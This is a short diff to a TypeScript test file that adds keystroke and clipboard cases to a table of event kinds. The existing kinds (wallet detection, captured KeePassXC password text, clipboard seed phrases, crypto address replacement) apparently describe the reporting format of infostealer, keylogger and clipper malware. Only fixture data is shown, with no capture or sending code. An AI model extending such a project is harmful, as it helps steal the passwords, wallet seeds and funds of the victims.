@@ -15,6 +15,8 @@ test('every contract kind keeps its data as labelled fields', () => {
   const cases: Array<[string, Record<string, unknown>, string[]]> = [
     ['wallet_detected', { name: 'Phantom', pid: 7, title: 'Phantom Wallet' }, ['Phantom', '7', 'Phantom Wallet']],
     ['wallet_closed', { pid: 7 }, ['7']],
+    ['keystroke', { text: 'hola', process: 'Notepad.exe', title: 'a.txt' }, ['Notepad.exe', 'a.txt', 'hola']],
+    ['clipboard', { content: 'texto', process: 'chrome.exe', title: 'Web' }, ['chrome.exe', 'Web', 'texto']],
     ['password', { process: 'KeePassXC.exe', title: 'KeePass', text: 's3cret' }, ['KeePassXC.exe', 'KeePass', 's3cret']],
     ['clipboard_secret', { kind: 'seed-12', value: 'abandon about', process: 'chrome.exe', title: 'Wallet', words: 12 }, ['seed-12', 'abandon about', 'chrome.exe', 'Wallet', '12']],
     ['clipboard_replace', { coin: 'btc', original: 'a', replacement: 'b' }, ['btc', 'a', 'b']],
